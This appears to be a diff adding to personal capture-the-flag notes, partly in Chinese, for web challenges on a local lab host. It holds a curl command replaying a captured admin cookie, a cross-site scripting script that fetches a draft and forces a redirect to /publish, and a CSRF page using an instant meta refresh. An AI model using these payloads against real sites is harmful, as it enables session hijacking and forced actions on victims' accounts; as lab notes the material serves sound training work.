@@ -180,3 +180,32 @@ fetch
         得到cookie后可以通过
         curl -b "auth=%3Dadmin%7C6F.dJDO1YDL5UTNxczW%7D" http://challenge.localhost/
             --得到了flag
+
+
+
+<script>
+fetch('/draft')
+.then(response => response.text())
+.then(data => { console.log(data); window.location.href = '/publish'; }) 
+.catch(error => console.error('Error:', error)); 
+</script>
+
+
+csrf 1
+    -
+    <!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="0; url=http://challenge.localhost/publish">
+    <title>CSRF Attack</title>
+  </head>
+  <body>
+    <p>If you are not redirected automatically, please <a href="http://challenge.localhost/publish">click here</a>.</p>
+  </body>
+</html>
+
+    --sensai给出的方法并不正确并不能让页面跳转到publich
+    --这个方法的meta可以让信息不显示在页面
+    --http-equiv="refresh" content="0; url=http://challenge.localhost/publish"
+        --相互配合让页面刷新，并且0秒后跳转到指定的url
